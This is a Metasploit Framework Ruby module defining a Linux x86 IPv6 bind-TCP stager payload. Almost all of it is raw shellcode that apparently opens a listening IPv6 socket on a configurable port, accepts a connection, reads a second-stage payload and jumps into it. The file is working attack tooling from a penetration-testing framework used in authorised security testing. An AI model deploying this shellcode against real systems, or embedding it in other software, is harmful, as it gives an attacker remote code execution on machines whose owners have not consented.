##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'

# Linux Bind TCP/IPv6 Stager
module Metasploit3

	include Msf::Payload::Stager
	include Msf::Payload::Linux

	def self.handler_type_alias
		"bind_ipv6_tcp"
	end

	def initialize(info = {})
		super(merge_info(info,
			'Name'        => 'Bind TCP Stager (IPv6)',
			'Version'     => '$Revision$',
			'Description' => 'Listen for a connection over IPv6',
			'Author'      => 'kris katterjohn',
			'License'     => MSF_LICENSE,
			'Platform'    => 'linux',
			'Arch'        => ARCH_X86,
			'Handler'     => Msf::Handler::BindTcp,
			'Stager'      => {
					'Offsets' => { 'LPORT' => [ 0x18, 'n' ] },
					'Payload' =>
						"\x31\xdb\x53\x43\x53\x6a\x0a\x89\xe1\x6a\x66\x58\xcd\x80\x96" +
						"\x99\x52\x52\x52\x52\x52\x52\x66\x68\xbf\xbf\x66\x68\x0a\x00" +
						"\x89\xe1\x6a\x1c\x51\x56\x89\xe1\x43\x6a\x66\x58\xcd\x80\xb0" +
						"\x66\xb3\x04\xcd\x80\x52\x52\x56\x89\xe1\x43\xb0\x66\xcd\x80" +
						"\x93\xb6\x0c\xb0\x03\xcd\x80\x89\xdf\xff\xe1"
				}
			))
	end
end
